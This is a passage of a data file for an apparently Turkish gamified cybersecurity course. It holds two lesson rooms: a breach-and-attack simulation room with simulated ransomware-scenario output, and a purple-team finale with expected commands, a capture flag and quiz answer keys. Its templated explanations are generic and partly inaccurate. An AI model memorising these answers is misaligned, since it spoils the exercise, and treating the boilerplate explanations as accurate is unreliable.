        "whyWeUse": "**Ezberlemeden Önce Mantığını Anla:** Gerçek bir siber güvenlik operasyonunda (3. Sürekli İyileştirme ve Tehdit Bilgisi) binlerce satırlık veriyi veya karmaşık sistem ayarlarını gözle kontrol etmek imkansızdır. Bu odada `bas-engine run --scenario 'ActiveDirectory-Ransomware-Simulation'` komutunu kullanmamızın sebebi; **BAS Otomasyonu: Sürekli Güvenlik Doğrulama Pipeline'ı** senaryosunda aradığımız kritik kanıtı, açık kapıyı veya güvenlik zafiyetini doğrudan işletim sistemi çekirdeğinden/loglarından hatasız şekilde çekmektir. bas-engine: Kurumsal güvenlik doğrulamalarını senaryo bazlı otomatize eden test aracıdır.",
        "cmdAnatomy": [
            {
                "token": "bas-engine",
                "role": "Ana Siber Araç / Komut",
                "desc": "Bu görevde çalıştırdığımız ana güvenlik veya sistem aracı (bas-engine)."
            },
            {
                "token": "run",
                "role": "Parametre Değeri / Hedef",
                "desc": "Komuta verilen arama kelimesi, kural veya hedef argüman (run)."
            },
            {
                "token": "--scenario",
                "role": "Komut Parametresi (Flag)",
                "desc": "Komutun çalışma davranışını özelleştiren ve detaylı analiz modunu açan parametre (--scenario)."
            },
            {
                "token": "'ActiveDirectory-Ransomware-Simulation'",
                "role": "Parametre Değeri / Hedef",
                "desc": "Komuta verilen arama kelimesi, kural veya hedef argüman ('ActiveDirectory-Ransomware-Simulation')."
            }
        ],
        "outputGuide": [
            {
                "snippet": "[BAS ENGINE v3.8] Initializing Continuous Validation Pipeline...",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "[*] Phase 1: Ingress Phishing Simulation -> BLOCKED by DMARC & WebFilter...",
                "meaning": "Güvenlik politikasının devreye girerek yetkisiz erişimi veya saldırı paketini **engellediğini** gösterir."
            },
            {
                "snippet": "[*] Phase 2: Lateral Movement (Pass-the-Hash) -> BLOCKED by Protected Us...",
                "meaning": "Güvenlik politikasının devreye girerek yetkisiz erişimi veya saldırı paketini **engellediğini** gösterir."
            },
            {
                "snippet": "[*] Phase 3: Mass File Encryption Attempt -> DETECTED by EDR Canary Trap...",
                "meaning": "Güvenlik analiz aracının şüpheli saldırı izini veya zararlı aktiviteyi **tespit ettiğini** gösteren uyarı satırıdır."
            }
        ],
        "beginnerTerms": [
            {
                "term": "bas-engine",
                "desc": "BAS Otomasyonu: Sürekli Güvenlik Doğrulama Pipeline'ı görevinde kullanılan temel siber güvenlik ve sistem analiz aracıdır."
            }
        ],
        "quickCheck": {
            "question": "Bu odada çalıştırdığımız `bas-engine run --scenario 'ActiveDirectory-Ransomware-Simulation'` komutunun temel amacı nedir?",
            "options": [
                "Active Directory Ransomware simülasyon senaryosunu otomatize BAS motoruyla çalıştırmak için bas-engine run --scenario 'ActiveDirectory-Ransomware-Simulation'",
                "Bilgisayarın ekran kartı sürücüsünü güncellemek",
                "Sistemi tamamen silip yeniden başlatmak"
            ],
            "answer": 0,
            "explanation": "Doğru! `bas-engine run --scenario 'ActiveDirectory-Ransomware-Simulation'` komutu ezbere yazılan bir kod değil; bas-engine: Kurumsal güvenlik doğrulamalarını senaryo bazlı otomatize eden test aracıdır."
        }
    },
    {
        "id": "purple-310",
        "track": "purple",
        "title": "Purple Team Zirvesi: Ortak Dayanıklılık & Yenilmez Savunma",
        "level": "3. Sürekli İyileştirme ve Tehdit Bilgisi",
        "badge": "PURPLE MASTERY & RESILIENCE VICTORY",
        "theory": "### Siber Güvenliğin Nirvana Noktası: Kırmızı ve Mavinin Zaferi\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nİki kardeş dövüşçünün her gün ringe çıkıp birbirlerinin tüm açıklarını bulması, sonra sarılıp eksiklerini kapatması ve dünya şampiyonasına çıktıklarında hiçbir rakibin onları devirememesi gibidir. Kırmızı saldırır, Mavi savunur, Mor ise kurumu yenilmez yapar.\n\n#### 14 Purple Team Odasını Tamamladınız!\nMITRE ATT&CK eşlemesinden Atomic Red Team simülasyonlarına, STRIDE tehdit modellemesinden BAS otomasyonuna kadar hibrit operasyonları yönetebilen Baş Siber Mimarlık yetkinliğine eriştiniz.",
        "mission": "69 odalık devasa LFL Siber Akademi müfredatının nihai mor zafer belgesini okumak için cat /opt/purple/reports/PURPLE_TEAM_EXERCISE_VICTORY.txt komutunu çalıştırın.",
        "expectedCommand": "cat /opt/purple/reports/PURPLE_TEAM_EXERCISE_VICTORY.txt",
        "acceptedCommands": [
            "cat /opt/purple/reports/PURPLE_TEAM_EXERCISE_VICTORY.txt",
            "cat PURPLE_TEAM_EXERCISE_VICTORY.txt",
            "more /opt/purple/reports/PURPLE_TEAM_EXERCISE_VICTORY.txt"
        ],
        "hintExplanation": "<p><strong>PURPLE_TEAM_EXERCISE_VICTORY.txt:</strong> Tüm akademinin en son ve en prestijli mezuniyet bayrağıdır.</p>",
        "terminalSuccessOutput": "========================================================================\n🔮 TEBRİKLER! TÜM LFL SİBER AKADEMİ MÜFREDATINI TAMAMLADINIZ! 🔮\n========================================================================\n[TAMAMLANAN TOPLAM MÜFREDAT: 69 GÖREV ODASI]\n🌱 Starter Track: 18 Temel Giriş Odası (Ağ, Linux, CLI, chmod, Kripto)\n🔴 Red Team: 20 Görev Odası (Ofansif Pentest, Metasploit, AD, EDR Bypass, C2)\n🔵 Blue Team: 17 Görev Odası (SIEM, Snort, Sysmon, RAM Forensics, Sigma, IR)\n🟣 Purple Team: 14 Görev Odası (MITRE, Atomic BAS, STRIDE, Gap Analizi)\n\nArtık hem saldıranın aklını okuyan hem de savunanın kalkanını yöneten\nKıdemli bir Siber Güvenlik Mimarı ve Hibrit Güvenlik Liderisiniz!\n\n[NİHAİ MOR BAYRAK]: LFL{purple_team_joint_resilience_mastery_achieved}\n========================================================================",
        "flag": "LFL{purple_team_joint_resilience_mastery_achieved}",
        "nextId": "starter-01",
        "whyWeUse": "**Ezberlemeden Önce Mantığını Anla:** Gerçek bir siber güvenlik operasyonunda (3. Sürekli İyileştirme ve Tehdit Bilgisi) binlerce satırlık veriyi veya karmaşık sistem ayarlarını gözle kontrol etmek imkansızdır. Bu odada `cat /opt/purple/reports/PURPLE_TEAM_EXERCISE_VICTORY.txt` komutunu kullanmamızın sebebi; **Purple Team Zirvesi: Ortak Dayanıklılık & Yenilmez Savunma** senaryosunda aradığımız kritik kanıtı, açık kapıyı veya güvenlik zafiyetini doğrudan işletim sistemi çekirdeğinden/loglarından hatasız şekilde çekmektir. PURPLE_TEAM_EXERCISE_VICTORY.txt: Tüm akademinin en son ve en prestijli mezuniyet bayrağıdır.",
        "cmdAnatomy": [
            {
                "token": "cat",
                "role": "Ana Komut (Concatenate / Dosya Oku)",
                "desc": "Bir metin dosyasının içindeki yazıları açıp doğrudan terminal ekranına yazdırır."
            },
            {
                "token": "/opt/purple/reports/PURPLE_TEAM_EXERCISE_VICTORY.txt",
                "role": "Dosya / Klasör Yolu",
                "desc": "Üzerinde okuma, analiz veya işlem yapılacak hedef dosya/klasör (/opt/purple/reports/PURPLE_TEAM_EXERCISE_VICTORY.txt)."
            }
        ],
        "outputGuide": [
            {
                "snippet": "========================================================================",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "🔮 TEBRİKLER! TÜM LFL SİBER AKADEMİ MÜFREDATINI TAMAMLADINIZ! 🔮",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "========================================================================",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "[TAMAMLANAN TOPLAM MÜFREDAT: 69 GÖREV ODASI]",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            }
        ],
        "beginnerTerms": [
            {
                "term": "cat",
                "desc": "Purple Team Zirvesi: Ortak Dayanıklılık & Yenilmez Savunma görevinde kullanılan temel siber güvenlik ve sistem analiz aracıdır."
            }
        ],
        "quickCheck": {
            "question": "Bu odada çalıştırdığımız `cat /opt/purple/reports/PURPLE_TEAM_EXERCISE_VICTORY.txt` komutunun temel amacı nedir?",
            "options": [
                "69 odalık devasa LFL Siber Akademi müfredatının nihai mor zafer belgesini okumak için cat /opt/purple/reports/PURPLE_TEAM_EXERCISE_VICTORY.txt",
                "Bilgisayarın ekran kartı sürücüsünü güncellemek",
                "Sistemi tamamen silip yeniden başlatmak"
            ],
            "answer": 0,
            "explanation": "Doğru! `cat /opt/purple/reports/PURPLE_TEAM_EXERCISE_VICTORY.txt` komutu ezbere yazılan bir kod değil; PURPLE_TEAM_EXERCISE_VICTORY.txt: Tüm akademinin en son ve en prestijli mezuniyet bayrağıdır."
        }
    }
];
